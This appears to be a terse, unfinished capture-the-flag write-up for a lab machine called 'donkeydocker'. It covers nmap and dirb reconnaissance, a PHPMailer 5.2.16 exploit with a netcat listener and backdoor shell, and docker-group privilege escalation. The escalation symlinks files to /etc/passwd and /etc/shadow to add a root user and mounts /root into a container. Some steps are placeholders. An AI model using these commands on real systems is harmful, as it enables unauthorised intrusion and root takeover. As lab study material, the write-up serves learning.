#this is a draft ... but yea i completed it


`sudo nmap -sn 192.168.110.0/24`

- Target IP address: 192.168.110.20
- Service Discovery

```
$ sudo nmap -p1-65535 -A -T4 -sS 192.168.110.20
Port	Service	Product	Hostname
22	ssh	OpenSSH	
80	http	Apache httpd	
```
- Path:

```
/contact.php
/index.php
/about.php
```
- recon:
`$ dirb http://192.168.110.20`

- found:
```
/about	
/contact	
/index	
/robots.txt	
/mailer/LICENSE	GNU GPL text
/mailer/examples/index.html	PHPMailer code examples
```

- This is PHPMailer. 
`/mailer/VERSION	5.2.16`

# Getting shell

- Found this in about.php:
```
$ searchsploit phpmailer
DD - Searchsploit results
Searchsploit results phpMailer
The exploit php/webapps/40974.py
```

```
target	http://192.168.110.20/contact
```

- Try:
`$ pip2 install requests_toolbelt`

- Listener:
`$ nc -lvp 4444`

- DD - Running Anarcoder exploit
- Backdoor: http://192.168.110.20/backdoor.php

-
`$ python -c 'import pty; pty.spawn("/bin/bash")'`

- Looking at /etc/passwd found smith

`SU Smith`

- SSH: Appears to be a private key pointing to orwell@donkeydocker. 

`SSH login`

```
$ id
Gives: uid=1000(orwell) gid=1000(orwell) groups=101(docker),1000(orwell).
```

```
$ docker container ls
DD - Docker list
Docker list
```

```
$ cd /home/smith/
$ mv flag.txt flag.txt.bak
$ ln -s /etc/passwd flag.txt
```

```
$ docker restart donkeydocker
```
- Adding myself as root:

```
$ echo 'reedphish:x:0:0::/root:/bin/bash' >> flag.txt
```

```
$ rm flag.txt
$ ln -s /etc/shadow flag.txt
```

```
$ echo 'reedphish:R2JhrPXIXqW3g:17251:0:99999:7:::' >> flag.txt
```

```
$ cd ~
$ mkdir hack
$ cd hack
$ touch Dockerfile
$ vi Dockerfile
In Dockerfile Iadded
```
```
$ docker run -v /root:/hack -t hackerimage /bin/sh -c 'ls -la'
$ docker run -v /root:/hack -t hackerimage /bin/sh -c 'cat flag.txt'
```